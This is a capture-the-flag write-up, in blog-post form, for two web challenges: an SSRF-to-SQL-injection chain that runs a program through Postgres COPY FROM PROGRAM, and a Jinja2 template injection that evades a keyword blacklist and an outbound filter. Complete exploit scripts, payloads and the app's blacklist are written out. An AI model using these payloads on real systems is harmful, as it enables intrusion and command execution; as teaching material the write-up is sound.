@@ -1,0 +1,679 @@
+---
+layout: post
+title: "SNI CTF 2025 - Web"
+date: 2025-12-13
+image: /assets/.
+categories: ["SNI"]
+tags: [web, sqli, ssti, lfi, ctf2025]
+excerpt: "Sqli injection, LFI and SSTI + Bypassing WAF on jinja2"
+---
+
+
+## Photo Gallery
+
+Target: `http://178.128.116.83:4321/`
+
+### Intro
+
+Right in front of you is just a cute *photo gallery*: upload an image, see the thumbnail, done.
+
+But precisely because it’s “just a gallery”, we often let our guard down about one thing: **where does the image have to be fetched from?**  
+And in this challenge, the answer makes you smirk: the server has an *image proxy/optimizer* that will `fetch()` any URL… and behind it there’s an internal API that *talks* to the database using hand-built query strings.
+
+I’ll walk through the journey from recon to the flag—compact, sharp, but still easy to follow.
+
+---
+
+### Recon: read the page, catch something “off”
+
+Open the target:
+
+```bash
+curl -sS http://178.128.116.83:4321/ | head
+```
+
+If you scroll the HTML source (or open it in the browser → View Source), the gallery section usually gives the most honest clues. And here, the thumbnails use a URL like this:
+
+```
+/_image?href=http%3A%2F%2Flocalhost%3A4321%2Fapi%2Fimages%2F<ID>&w=320&h=320&f=webp
+```
+
+In other words: **the server fetches a `href=`**, then transforms it into an image (`w/h/f`).
+
+In CTF land, this pattern often means one word: **SSRF**.
+
+---
+
+### System map: two services, one front door
+
+From `docker-compose.yml`:
+
+```yaml
+app:
+  ports:
+    - "4321:4321"
+```
+
+Inside the `app` container, there are two processes (see `deploy/apps/start.sh`):
+
+```sh
+python3 /app/internal/app.py &   # Flask API (port 5000)
+node /app/external/dist/server/entry.mjs &  # Astro frontend (port 4321)
+```
+
+The Astro frontend on `:4321` is the “front door”. The internal Flask service runs on `:5000` and *shouldn’t* be directly reachable from outside.
+
+If there’s SSRF, that means: **we can force Astro to talk to Flask**.
+
+---
+
+### Bug #1 — SSRF via `/_image` (Astro image optimizer)
+
+The config is *too permissive* (`deploy/apps/external/astro.config.mjs`):
+
+```js
+image: { remotePatterns: [{ protocol: 'http' }, { protocol: 'https' }] },
+```
+
+Meaning: as long as `href=` is `http(s)://...`, Astro will try to fetch it.
+
+And because the fetch happens **server-side**, targets like these become fair game:
+
+- `http://localhost:5000/...` (internal Flask)
+- `http://127.0.0.1:5000/...`
+- even other internal services, if any exist
+
+This isn’t just SSRF for “port checking”. This is SSRF that truly *bridges* into the internal backend.
+
+---
+
+### Bug #2 — SQL injection that “only shows up when the param is duplicated”
+
+Now let’s look at the Flask API (`deploy/apps/internal/blueprints/api.py`). There’s a tiny helper:
+
+```py
+def get_param(name, default=None):
+    values = request.args.getlist(name)
+    if not values:
+        return default
+    if len(values) == 1:
+        return values[0]
+    return values
+```
+
+If we send `?title=x`, `title` is a string.  
+But if we send `?title=x&title=y`, `title` becomes a **list**.
+
+Then `title` is used in this query:
+
+```py
+rows = conn.run(
+  f"SELECT ... FROM images "
+  f"WHERE title={literal(title)} OR {literal(title)} IS NULL "
+  f"ORDER BY id DESC LIMIT {literal(limit)} OFFSET {literal((page - 1) * limit)}",
+)
+```
+
+At first glance it looks safe because it uses `pg8000.native.literal(...)`. The problem is: `literal()` has special handling for `list`.
+
+When `title` is a list, `literal(list)` builds a Postgres string array without escaping `'` characters inside each element. So a payload like:
+
+```
+title=x'; <OUR-SQL>; --
+title=y
+```
+
+will produce a query fragment that “breaks” like this (conceptually):
+
+```
+WHERE title='{x'; <OUR-SQL>; -- ,y}' OR ...
+```
+
+The single quote from the payload closes the string early → the rest becomes raw SQL → **stacked queries** execute.
+
+This is the most satisfying “click” moment: the bug isn’t in a normal `title`, but in a **duplicated `title` parameter**.
+
+---
+
+### Why this leads to a flag: the DB container has `/readflag` SUID
+
+In `deploy/db/Dockerfile`:
+
+```dockerfile
+COPY flag /flag
+RUN chmod 400 /flag
+RUN gcc /readflag.c -o /readflag
+RUN chmod 4755 /readflag
+```
+
+`/flag` can only be read by root. But there’s a `/readflag` binary with SUID root, and its job is simply:
+
+```c
+fopen("/flag","r"); fgets(...); printf("%s\n", s);
+```
+
+If we can make Postgres execute `/readflag`, we get the flag contents.
+
+Postgres has an “official but naughty” feature: `COPY ... FROM PROGRAM 'cmd'`.
+
+So the goal is clear:
+
+1) SQLi → run `COPY ... FROM PROGRAM '/readflag'`  
+2) store the output somewhere we can read from the web (e.g., `images.title`)  
+3) fetch it again through the public `/api/images` endpoint
+
+---
+
+### Exploit: SSRF ➜ SQLi ➜ COPY FROM PROGRAM ➜ flag appears in title
+
+#### 1) SQL payload (stacked query)
+
+Strategy:
+
+- create a table `leak(flag text)`
+- `COPY leak FROM PROGRAM '/readflag'`
+- `UPDATE images SET title=(SELECT flag FROM leak LIMIT 1) WHERE id=(SELECT MAX(id) FROM images)`
+
+I used `/**/` as a space replacement to be more “URL-friendly”.
+
+#### 2) Wrap it with SSRF `/_image?href=...`
+
+Because from the outside we can only access `:4321`, we “relay the request” through Astro’s image optimizer:
+
+```bash
+URL="$(python3 - <<'PY'
+import urllib.parse
+HOST = "178.128.116.83:4321"
+payload = (
+  "x';BEGIN;"
+  "DROP/**/TABLE/**/IF/**/EXISTS/**/leak;"
+  "CREATE/**/TABLE/**/leak(flag/**/text);"
+  "COPY/**/leak/**/FROM/**/PROGRAM/**/'/readflag';"
+  "UPDATE/**/images/**/SET/**/title=("
+    "SELECT/**/flag/**/FROM/**/leak/**/LIMIT/**/1"
+  ")/**/WHERE/**/id=("
+    "SELECT/**/MAX(id)/**/FROM/**/images"
+  ");"
+  "COMMIT;--"
+)
+inner = (
+  "http://localhost:5000/api/images?"
+  "title=" + urllib.parse.quote(payload, safe="") +
+  "&title=y"
+)
+print(
+  f"http://{HOST}/_image?"
+  "href=" + urllib.parse.quote(inner, safe="") +
+  "&w=1&h=1&f=png"
+)
+PY
+)"
+
+curl -sS "$URL" -o /dev/null -w "%{http_code}\n"
+```
+
+Note: a `500` response is normal; what matters is that the SQL side effects execute.
+
+#### 3) Fetch the flag from the public endpoint
+
+After the SQL succeeds, the flag will show up as the `title` of the newest item:
+
+```bash
+curl -sS http://178.128.116.83:4321/api/images | rg 'SNI\\{'
+```
+
+And we get the flag.
+
+### Flag
+
+`SNI{s1mpL3_$$RF_$Qli_R1ght?}`
+
+---
+
+## SNI Basecamp
+
+Target: `http://178.128.116.83:33339/`
+
+### Intro
+
+At a glance, the **SNI Basecamp** challenge looks like a typical “landing page template”: a Bootstrap navbar, a role status in the corner, and a few menus like **Preview**, **Render**, **Multiplier**, and **Media**. The home page is also plain:
+
+```bash
+$ curl -i http://178.128.116.83:33339/
+...
+STATUS: USER
+```
+
+No login form, no “promote to admin” button. But there’s one very tempting route:
+
+- `/admin` → always says “Access denied.” while our role is still USER
+- `/flag` → only accessible if `session["is_admin"] == True`
+
+So the mission is clear: **how do we upgrade ourselves from USER to ADMIN, or at least read the flag without going through the official path**.
+
+The interesting part: the backend is Flask, templating is Jinja2, and there’s a small WAF trying to stop us. In this write-up, I’ll walk through recon, source review, and finding the SSTI chain + WAF bypass + outbound-filter bypass that finally lets us interact directly with `FLAG`.
+
+---
+
+### Recon: tour the pages & features
+
+First, visit all public endpoints:
+
+```bash
+$ curl -i http://178.128.116.83:33339/
+$ curl -i http://178.128.116.83:33339/admin
+$ curl -i http://178.128.116.83:33339/preview
+$ curl -i http://178.128.116.83:33339/render
+$ curl -i http://178.128.116.83:33339/multiplier
+$ curl -i http://178.128.116.83:33339/media
+```
+
+Quick observations:
+
+- `/admin` always shows “Restricted – Access denied.”, but **the HTTP status is 200** (not a redirect, not 403).
+- `/preview` provides an “Expression” form and executes that expression server-side, then prints the output inside a “terminal”.
+- `/render` is similar, but lets us choose the **body expression** and the **layout**.
+- `/multiplier` takes two expressions: one for the **header key**, one for the **header value**. The output is written to an HTTP header and the `trace` cookie.
+- `/media` only embeds a YouTube video (a distraction).
+
+So there are three strong candidates for web bugs:
+
+1. `/preview` (Jinja expression execution)
+2. `/render` (more flexible, can choose layout)
+3. `/multiplier` (Jinja execution with output to header/cookie)
+
+For the rest, we need to read the source to see whether this is just a calculator or already **full-power SSTI**.
+
+---
+
+### Read the source: understanding the author’s “sandbox”
+
+In the environment, there’s only one file:
+
+```bash
+$ ls
+app.py
+```
+
+The core logic is in `app.py`, with the key highlights like this (summarized):
+
+```py
+app = Flask(__name__)
+app.secret_key = SECRET
+
+with open("flag.txt", "r") as f:
+    FLAG = f.read().strip()
+
+def helper():
+    return 1
+
+def xs(seq, start=0, end=None):
+    return seq[start:end]
+
+def xr(s, a, b):
+    return str(s).replace(a, b)
+
+app.jinja_env.globals["h"] = helper
+app.jinja_env.filters["xs"] = xs
+app.jinja_env.filters["xr"] = xr
+```
+
+A few interesting points jump out immediately:
+
+- `FLAG` is read once into a global, not read from disk per request.
+- A helper `h` is exposed to Jinja as a global.
+- Two custom filters `xs` and `xr` can help with string manipulation.
+
+Then there’s an aggressive inbound WAF:
+
+```py
+BLACK_LIST = [
+    "application", "request", "wsgi", "environ", "getitem", "}}", "{{", "import", "from",
+    "builtin", "builtins", "os", "system", "popen", "subprocess", "eval", "exec", "code",
+    "read", "open", "file", "path", "root", "home", "bin", "bash", "sh", "cat", "flag", "secret",
+    "session", "cookie", "config", "globals", "mro", "subclass", "subclasses", "class", "type",
+    "base", "inspect", "sys", "site", "loader", "importlib", "compile", "lambda", "locals", "vars",
+    "dir", "repr", "format", "python", "jinja", "safe", "range", "join", "joiner", "cycler",
+    "namespace", "update", "pop", "clear", "items", "values", "walk", "glob", "json", "pickle",
+    "marshal", "yaml", "hash", "hashlib", "get", "attribute", "groupby",
+]
+
+def is_blocked(value):
+    if not value:
+        return False
+    try:
+        lowered = unicodedata.normalize("NFKC", str(value)).lower()
+    except Exception:
+        lowered = str(value).lower()
+    return any(x in lowered for x in BLACK_LIST)
+
+@app.before_request
+def inbound_waf():
+    parts = [request.path, request.query_string.decode("latin-1", "ignore"), body, ...]
+    ...
+    for part in parts:
+        if part and is_blocked(part):
+            return Response("blocked", status=400, mimetype="text/plain")
+```
+
+So:
+
+- **Every** request (path, query, body) is scanned for blacklisted substrings (case-insensitive, after Unicode normalization).
+- If even one matches → immediate `blocked`.
+
+To top it off, there’s an even harsher outbound WAF:
+
+```py
+BLOCKED_PREFIX = "SNI{"
+
+@app.after_request
+def outbound_waf(response):
+    ...
+    combined = "\n".join(parts)
+    if FLAG in combined or BLOCKED_PREFIX.lower() in combined.lower():
+        return Response("denied", mimetype="text/plain")
+    return response
+```
+
+Meaning:
+
+- Even if we manage to execute SSTI and touch `FLAG`, as long as the string `FLAG` or the substring `"SNI{"` appears in the **response body or headers**, the final output is replaced with `"denied"`.
+- So the game isn’t just “read the flag”, but **read the flag without ever emitting `SNI{` on the wire**.
+
+---
+
+### Main bug: SSTI in `/preview`, `/render`, and `/multiplier`
+
+Now let’s look at the suspicious handlers.
+
+#### `/preview`
+
+```py
+@app.route("/preview")
+def preview():
+    expr = request.args.get("tpl", "")
+    if not expr:
+        return render_template("preview.html", result="", expr="")
+    if is_blocked(expr):
+        return render_template("preview.html", result="blocked", expr=expr)
+    try:
+        out = render_template_string("{{" + expr + "}}")
+    except Exception:
+        out = "error"
+    return render_template("preview.html", result=out, expr=expr)
+```
+
+`expr` is fed straight into Jinja as an expression inside `{{ ... }}`. This is classic **Server-Side Template Injection**, but fenced in by:
+
+- the blacklist WAF (`is_blocked(expr)`)
+- the outbound filter (must not output `FLAG`/`SNI{` in the response)
+
+A simple test:
+
+```bash
+$ curl "http://178.128.116.83:33339/preview?tpl=1+2"
+...
+output
+3
+```
+
+Meaning: we can execute arbitrary Jinja expressions, as long as the string passes the blacklist.
+
+### `/render`
+
+```py
+@app.route("/render")
+def render_view():
+    raw = request.query_string.decode("latin-1", "ignore")
+
+    tpl = ""
+    layout = "base.html"
+
+    for part in raw.split("&"):
+        if part.startswith("tpl="):
+            tpl = part[4:]
+        elif part.startswith("layout="):
+            layout = part[7:] or "base.html"
+
+    ...
+    if is_blocked(tpl) or is_blocked(layout):
+        return render_template("render.html", expr=tpl, layout=layout, result="blocked")
+
+    try:
+        t = (
+            "{% extends '"
+            + layout
+            + "' %}{% block content %}{{"
+            + tpl
+            + "}}{% endblock %}"
+        )
+        out = render_template_string(t, is_admin=session.get("is_admin"))
+    except Exception:
+        out = "error"
+```
+
+`tpl` here is also a Jinja expression, just like in `/preview`, but wrapped with `{% extends ... %}`. Interesting, but for the final exploitation I didn’t need this route—`/preview` is simpler.
+
+#### `/multiplier`
+
+```py
+@app.route("/multiplier")
+def multiplier():
+    k = request.args.get("k", "")
+    v = request.args.get("v", "")
+    ...
+    if is_blocked(k) or is_blocked(v):
+        ...
+
+    try:
+        rk_raw = render_template_string("{{" + k + "}}")
+        rv = render_template_string("{{" + v + "}}")
+    except Exception:
+        ...
+
+    header_name = "".join(ch for ch in rk_raw if 33 <= ord(ch) <= 126) or "X-Trace"
+    header_name = header_name[:64]
+    header_value = str(rv)[:128]
+
+    resp.headers[header_name] = header_value
+    resp.set_cookie("trace", header_value, httponly=False, samesite="Lax")
+```
+
+Here we also get double SSTI: `k` for the header name, `v` for the value. The result `rv` is placed into both a header *and* a cookie. Again, everything is still under the outbound WAF (if `"SNI{"` appears in a header, it gets caught too).
+
+**Conclusion:** we have multiple SSTI engines, but they all are:
+
+- input-filtered by the blacklist `is_blocked`
+- output-censored by the outbound WAF (`FLAG` / `SNI{` → `denied`)
+
+The real challenge: **not just “get SSTI”, but bypass both layers at once**.
+
+---
+
+### Touching `FLAG` through Jinja: bypass the blacklist
+
+Next step: find a way to reach `FLAG` from inside the Jinja sandbox.
+
+In Python, module globals can be accessed from Jinja if we can obtain the module object, or leverage built-in globals. Here there’s a clue: the helper `h` is injected as a global:
+
+```py
+app.jinja_env.globals["h"] = helper
+```
+
+In Jinja, `h` is a Python function object. Usually, from a function we can traverse to `__globals__`, which contains all module-level variables, including `FLAG`. In Jinja, attributes can be accessed with the `attr` filter.
+
+In theory, the expression is:
+
+```jinja2
+(h|attr("__globals__"))["FLAG"]
+```
+
+Problem: both `globals` and `flag` are in the blacklist:
+
+- `"globals"` → in `BLACK_LIST`
+- `"flag"` → also blocked
+
+We need a way to build the strings `"__globals__"` and `"FLAG"` **without writing them literally**.
+
+Luckily, Jinja has the concatenation operator `~`. So `"__glo" ~ "bals__"` does not contain the substring `"globals"` in the source, but at runtime it becomes `"__globals__"`. The same trick works for `"FLAG"`:
+
+```jinja2
+('__glo' ~ 'bals__')   → "__globals__"
+'F' ~ 'L' ~ 'A' ~ 'G'  → "FLAG"
+```
+
+So a stealthier SSTI payload is:
+
+```jinja2
+(h|attr('__glo'~'bals__'))['F'~'L'~'A'~'G']
+```
+
+Before testing it against the server, I first checked locally whether this string would hit the blacklist (to avoid repeatedly getting “blocked”):
+
+```py
+BLACK_LIST = [...]
+def is_blocked(value):
+    import unicodedata
+    if not value:
+        return False
+    try:
+        lowered = unicodedata.normalize("NFKC", str(value)).lower()
+    except Exception:
+        lowered = str(value).lower()
+    return any(x in lowered for x in BLACK_LIST)
+
+expr = "(h|attr('__glo'~'bals__'))['F'~'L'~'A'~'G']"
+print(is_blocked(expr))          # False
+```
+
+It prints `False`, meaning **the payload is safe from the inbound WAF**.
+
+Now try it in local Jinja with a dummy FLAG:
+
+```py
+from jinja2 import Environment
+
+env = Environment()
+FLAG = "SNI{test_flag}"
+
+def helper():
+    return 1
+
+expr = "(h|attr('__glo'~'bals__'))['F'~'L'~'A'~'G']"
+tpl = env.from_string("{{ " + expr + " }}")
+print(tpl.render(h=helper, FLAG=FLAG))
+```
+
+Output:
+
+```text
+SNI{test_flag}
+```
+
+So in theory, the server behaves the same. But if we send it directly:
+
+```bash
+GET /preview?tpl=(h|attr('__glo'~'bals__'))['F'~'L'~'A'~'G']
+```
+
+even though the inbound WAF allows it, the outbound WAF will panic because the response body contains `"SNI{"` → the final output becomes `"denied"`.
+
+We need a way to leak `FLAG` **without triggering the substring `"SNI{"`**.
+
+---
+
+### Bypass the outbound WAF: reverse the FLAG string
+
+A classic trick to bypass substring filters is to transform the server-side output so the value sent to the client no longer contains the pattern being searched for, but is still sufficient for us to reconstruct on our side.
+
+The outbound WAF only checks:
+
+- `if FLAG in combined`
+- `or "sni{" in combined.lower()`
+
+It doesn’t check the reverse, it doesn’t check hex, it doesn’t check base64. That means we can:
+
+1. Generate the FLAG, then **reverse** it before returning.
+2. On the client side, reverse again to recover the original.
+
+In Jinja, reversing a string can be done with slicing `[::-1]`. So the expression:
+
+```jinja2
+(h|attr('__glo'~'bals__'))['F'~'L'~'A'~'G']
+```
+
+becomes:
+
+```jinja2
+(h|attr('__glo'~'bals__'))['F'~'L'~'A'~'G'][::-1]
+```
+
+I verified it locally:
+
+```py
+from jinja2 import Environment
+
+env = Environment()
+FLAG = "SNI{test_flag}"
+
+def helper():
+    return 1
+
+expr = "(h|attr('__glo'~'bals__'))['F'~'L'~'A'~'G'][::-1]"
+tpl = env.from_string("{{ " + expr + " }}")
+print(tpl.render(h=helper, FLAG=FLAG))
+```
+
+Output:
+
+```text
+}galf_tset{INS
+```
+
+There’s no `"SNI{"` in this string, so the outbound WAF should be happy. Now just send it to the server.
+
+On the HTTP side, I used `curl` without any special encoding, just disabling globbing:
+
+```bash
+$ curl --globoff \
+  "http://178.128.116.83:33339/preview?tpl=(h|attr('__glo'~'bals__'))['F'~'L'~'A'~'G'][::-1]"
+```
+
+The HTML output (trimmed to the important part):
+
+```html
+<div class="terminal mt-4">
+  <div><span class="prompt">preview</span>:<span class="path">/run</span>$ output</div>
+  <div>}sss4pyb_3lpmis_4_tsuj_aw1jd_p4tn4um{INS</div>
+</div>
+```
+
+The string in the terminal:
+
+```text
+}sss4pyb_3lpmis_4_tsuj_aw1jd_p4tn4um{INS
+```
+
+If we reverse it again locally:
+
+```bash
+$ python - << 'PY'
+s = "}sss4pyb_3lpmis_4_tsuj_aw1jd_p4tn4um{INS"
+print(s[::-1])
+PY
+```
+
+Result:
+
+```text
+SNI{mu4nt4p_dj1wa_just_4_simpl3_byp4sss}
+```
+
+The outbound WAF doesn’t complain, because the data on the wire never contains the substring `"SNI{"`, but we still recover the flag on our side.
+
+
+### Flag
+
+`SNI{mu4nt4p_dj1wa_just_4_simpl3_byp4sss}`
+
+---
